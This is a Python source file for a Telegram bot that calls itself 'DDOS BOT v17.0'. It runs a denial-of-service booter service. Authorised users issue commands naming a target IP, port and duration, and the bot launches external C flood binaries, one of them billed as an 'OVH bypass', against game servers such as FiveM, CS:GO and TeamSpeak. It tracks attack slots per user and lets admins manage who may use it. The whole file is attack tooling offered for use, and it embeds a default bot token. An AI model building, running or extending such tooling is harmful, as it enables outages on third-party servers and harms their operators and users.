#!/usr/bin/env python3
"""
💀 DDOS BOT v17.0 - C BINARIES + SLOTS 💀
"""

import telebot
import subprocess
import os
import threading
import time
import sys
import psutil
import uuid

# ========== CONFIGURATION ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "8552745024:AAGF5KQ8Y5H-s0UqphhvKIaoZso2LSXouA")
ADMIN_IDS = os.getenv("ADMIN_IDS", "8908646607").split(",")
USER_FILE = "users.txt"

MAX_SLOTS_PER_USER = 10
MAX_GLOBAL_SLOTS = 50

allowed_users = []
running_attacks = {}
attack_slots = {}
global_slot_count = 0
bot = telebot.TeleBot(BOT_TOKEN)
lock = threading.Lock()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ========== C BINARY ATTACKS ==========
ATTACKS = {
    'fivem_ovh': ('./fivem_ovh', 'FiveM OVH Bypass (C)'),
    'game_flood': ('./game_flood', 'Game Server Flood (C)'),
}

# ========== FUNCTIONS ==========

def load_users():
    try:
        with open(os.path.join(BASE_DIR, USER_FILE), "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user(user_id):
    with open(os.path.join(BASE_DIR, USER_FILE), "a") as f:
        f.write(f"{user_id}\n")

def can_start_attack(user_id):
    with lock:
        user_slots = attack_slots.get(user_id, 0)
        if user_slots >= MAX_SLOTS_PER_USER:
            return False, f"❌ Max slots reached ({MAX_SLOTS_PER_USER})"
        if global_slot_count >= MAX_GLOBAL_SLOTS:
            return False, f"❌ Global limit reached ({MAX_GLOBAL_SLOTS})"
        return True, "OK"

def add_attack_slot(user_id):
    with lock:
        global global_slot_count
        attack_slots[user_id] = attack_slots.get(user_id, 0) + 1
        global_slot_count += 1

def remove_attack_slot(user_id):
    with lock:
        global global_slot_count
        if user_id in attack_slots and attack_slots[user_id] > 0:
            attack_slots[user_id] -= 1
            global_slot_count -= 1
            if attack_slots[user_id] == 0:
                del attack_slots[user_id]

def execute_attack(user_id, attack_type, target, port, duration, extra=None):
    if attack_type not in ATTACKS:
        return False, f"Unknown attack"
    
    can_start, msg = can_start_attack(user_id)
    if not can_start:
        return False, msg
    
    try:
        attack_id = str(uuid.uuid4())[:8]
        
        if attack_type == 'fivem_ovh':
            threads = "2000"
            pps = "-1"
            cmd = ["./fivem_ovh", target, str(port), threads, pps, str(duration)]
        elif attack_type == 'game_flood':
            src_ip = "0.0.0.0"
            src_port = "0"
            threads = "2000"
            pps = "-1"
            game = extra if extra else "fivem"
            cmd = ["./game_flood", target, str(port), src_port, src_ip, threads, pps, str(duration), game]
        else:
            return False, f"Unknown attack type"
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
        )
        
        add_attack_slot(user_id)
        
        with lock:
            if user_id not in running_attacks:
                running_attacks[user_id] = []
            running_attacks[user_id].append({
                'id': attack_id,
                'process': process,
                'attack_type': attack_type,
                'target': target,
                'port': port,
                'duration': duration,
                'start_time': time.time()
            })
        
        def cleanup():
            try:
                process.wait()
            except:
                pass
            finally:
                remove_attack_slot(user_id)
        
        threading.Thread(target=cleanup, daemon=True).start()
        
        if extra:
            return True, f"✅ {description} ({extra.upper()})\n📋 ID: {attack_id}\n🎯 {target}:{port}\n⏱️ {duration}s"
        return True, f"✅ {description}\n📋 ID: {attack_id}\n🎯 {target}:{port}\n⏱️ {duration}s"
        
    except Exception as e:
        return False, f"Error: {str(e)}"

def stop_user_attacks(user_id, attack_id=None):
    with lock:
        if user_id not in running_attacks:
            return 0, "No attacks found"
        
        count = 0
        attacks_to_remove = []
        
        for attack in running_attacks[user_id]:
            if attack_id and attack.get('id') != attack_id:
                continue
            try:
                attack['process'].terminate()
                time.sleep(0.5)
                attack['process'].kill()
                remove_attack_slot(user_id)
                count += 1
                attacks_to_remove.append(attack)
            except:
                pass
        
        for attack in attacks_to_remove:
            running_attacks[user_id].remove(attack)
        
        if not running_attacks[user_id]:
            del running_attacks[user_id]
        
        return count, f"✅ Stopped {count} attack(s)"

# ========== TELEGRAM COMMANDS ==========

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, """💀 DDOS BOT v17.0 - C BINARIES + SLOTS 💀

🔥 C BINARY ATTACKS:
/fivem_ovh <target> <port> <time> - FiveM OVH Bypass (C)
/game_flood <target> <port> <time> <game> - Game Flood (C)

📌 GAME OPTIONS: cs16, fivem, fivem2, gmod, csgo, ts3, amongus, source

🛑 CONTROL:
/stopall - Stop all attacks
/stop <id> - Stop specific attack
/status - Check attacks
/slots - Check slots
/id - Get your ID

Example: /fivem_ovh 1.2.3.4 30120 60""")

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, """💀 COMMANDS 💀

/fivem_ovh 1.2.3.4 30120 60
/game_flood 1.2.3.4 27015 60 csgo

/stopall - Stop all attacks
/stop <id> - Stop specific attack
/status - Check attacks
/slots - Check slots
/id - Get your ID""")

@bot.message_handler(commands=['id'])
def id_command(message):
    bot.reply_to(message, f"Your ID: `{message.chat.id}`", parse_mode="Markdown")

@bot.message_handler(commands=['slots'])
def slots_command(message):
    user_id = str(message.chat.id)
    with lock:
        user_slots = attack_slots.get(user_id, 0)
        response = f"""📊 SLOTS

👤 Your slots: {user_slots}/{MAX_SLOTS_PER_USER}
🌐 Global slots: {global_slot_count}/{MAX_GLOBAL_SLOTS}
📌 Available: {MAX_SLOTS_PER_USER - user_slots}"""
        bot.reply_to(message, response)

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = str(message.chat.id)
    with lock:
        if user_id not in running_attacks:
            bot.reply_to(message, "📭 No active attacks")
            return
        
        msg = f"🔥 ACTIVE ATTACKS ({len(running_attacks[user_id])})\n\n"
        for attack in running_attacks[user_id]:
            elapsed = int(time.time() - attack['start_time'])
            remaining = max(0, attack['duration'] - elapsed)
            msg += f"🆔 {attack['id']}\n"
            msg += f"📌 {attack['attack_type']} → {attack['target']}:{attack['port']}\n"
            msg += f"⏱️ {remaining}s remaining\n"
            msg += f"🛑 /stop {attack['id']}\n\n"
        
        bot.reply_to(message, msg)

@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_id = str(message.chat.id)
    parts = message.text.split()
    
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /stop <attack_id>")
        return
    
    attack_id = parts[1]
    count, msg = stop_user_attacks(user_id, attack_id)
    bot.reply_to(message, msg)

@bot.message_handler(commands=['stopall'])
def stopall_command(message):
    user_id = str(message.chat.id)
    count, msg = stop_user_attacks(user_id)
    bot.reply_to(message, msg)

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    bot.reply_to(message, """👑 ADMIN:
/add <userid> - Add user
/remove <userid> - Remove user
/allusers - List users
/globalstop - Stop ALL attacks""")

@bot.message_handler(commands=['add'])
def add_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /add <userid>")
        return
    new_user = parts[1]
    if new_user in allowed_users:
        bot.reply_to(message, f"User {new_user} already exists")
        return
    allowed_users.append(new_user)
    save_user(new_user)
    bot.reply_to(message, f"✅ User {new_user} added")

@bot.message_handler(commands=['remove'])
def remove_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /remove <userid>")
        return
    user_to_remove = parts[1]
    if user_to_remove not in allowed_users:
        bot.reply_to(message, f"User {user_to_remove} not found")
        return
    allowed_users = [u for u in allowed_users if u != user_to_remove]
    with open(os.path.join(BASE_DIR, USER_FILE), "w") as f:
        for u in allowed_users:
            f.write(f"{u}\n")
    bot.reply_to(message, f"✅ User {user_to_remove} removed")

@bot.message_handler(commands=['allusers'])
def allusers_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    if not allowed_users:
        bot.reply_to(message, "No users")
        return
    response = "👥 Users:\n"
    for uid in allowed_users:
        try:
            info = bot.get_chat(int(uid))
            username = f"@{info.username}" if info.username else "Unknown"
            response += f"• {username} (ID: {uid})\n"
        except:
            response += f"• ID: {uid}\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['globalstop'])
def globalstop_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    
    total = 0
    with lock:
        for uid in list(running_attacks.keys()):
            count, _ = stop_user_attacks(uid)
            total += count
    
    bot.reply_to(message, f"✅ Stopped {total} global attacks")

def make_handler(attack_type):
    def handler(message):
        user_id = str(message.chat.id)
        if user_id not in allowed_users and user_id not in ADMIN_IDS:
            bot.reply_to(message, "❌ Not authorized")
            return
        
        parts = message.text.split()
        
        if attack_type == 'game_flood':
            if len(parts) < 5:
                bot.reply_to(message, f"Usage: /game_flood <target> <port> <time> <game>")
                return
            target = parts[1]
            port = int(parts[2])
            duration = int(parts[3])
            game = parts[4]
            
            status_msg = bot.reply_to(message, f"⚡ Starting {game.upper()} (C) attack...")
            success, msg = execute_attack(user_id, attack_type, target, port, duration, game)
        elif attack_type == 'fivem_ovh':
            if len(parts) != 4:
                bot.reply_to(message, f"Usage: /fivem_ovh <target> <port> <time>")
                return
            target = parts[1]
            port = int(parts[2])
            duration = int(parts[3])
            
            status_msg = bot.reply_to(message, f"⚡ Starting FiveM OVH (C) attack...")
            success, msg = execute_attack(user_id, attack_type, target, port, duration)
        else:
            bot.reply_to(message, f"Unknown command")
            return
        
        if success:
            bot.edit_message_text(f"✅ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)
        else:
            bot.edit_message_text(f"❌ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)
    
    return handler

# Register attacks
attacks = ['fivem_ovh', 'game_flood']
for attack in attacks:
    handler = make_handler(attack)
    handler.__name__ = f"handle_{attack}"
    setattr(sys.modules[__name__], handler.__name__, handler)
    bot.message_handler(commands=[attack])(handler)

# ========== MAIN ==========

if __name__ == "__main__":
    print("=" * 60)
    print("💀 DDOS BOT v17.0 - C BINARIES + SLOTS 💀")
    print("=" * 60)
    
    # Check C binaries
    for name in ['fivem_ovh', 'game_flood']:
        if os.path.exists(name):
            print(f"[+] {name} - READY")
        else:
            print(f"[-] {name} - MISSING (compile with gcc)")
    
    allowed_users = load_users()
    for admin in ADMIN_IDS:
        if admin not in allowed_users:
            allowed_users.append(admin)
            save_user(admin)
    
    print(f"[+] Loaded {len(allowed_users)} users")
    print(f"[+] Max slots per user: {MAX_SLOTS_PER_USER}")
    print(f"[+] Max global slots: {MAX_GLOBAL_SLOTS}")
    print("=" * 60)
    print("[+] Bot running! Press Ctrl+C to stop.")
    bot.polling(none_stop=True)
